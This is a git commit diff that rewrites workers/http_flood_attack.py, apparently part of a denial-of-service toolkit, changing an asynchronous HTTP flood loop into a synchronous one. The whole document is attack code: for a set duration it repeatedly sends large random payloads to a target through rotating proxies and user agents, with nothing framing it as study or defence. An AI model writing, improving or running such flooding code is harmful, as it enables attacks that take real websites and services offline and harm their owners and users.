a95439bd12ec78cec514f6372c2bb93be3462a80
Sakuzuna <nikita.kopychev@s.wingateschool.com>
2025-02-26 23:50:44 +0000

    Update http_flood_attack.py

--- workers/http_flood_attack.py
+++ workers/http_flood_attack.py
@@ -1,13 +1,12 @@
-import asyncio
+import time
 from utils.http_bot import HTTPBot
 from utils.random_utils import random_string
 
-async def http_flood_attack(target, proxies, user_agents, duration, packet_size, packet_delay):
+def http_flood_attack(target, proxies, user_agents, duration, packet_size, packet_delay):
     bot = HTTPBot(proxies, user_agents)
-    end_time = asyncio.get_event_loop().time() + duration
+    end_time = time.time() + duration
 
-    async with aiohttp.ClientSession() as session:
-        while asyncio.get_event_loop().time() < end_time:
-            payload = random_string(packet_size * 1024)  
-            await bot.send_request(session, target, payload)
-            await asyncio.sleep(packet_delay / 1000)  
+    while time.time() < end_time:
+        payload = random_string(packet_size * 1024) 
+        bot.send_request(target, payload)
+        time.sleep(packet_delay / 1000) 
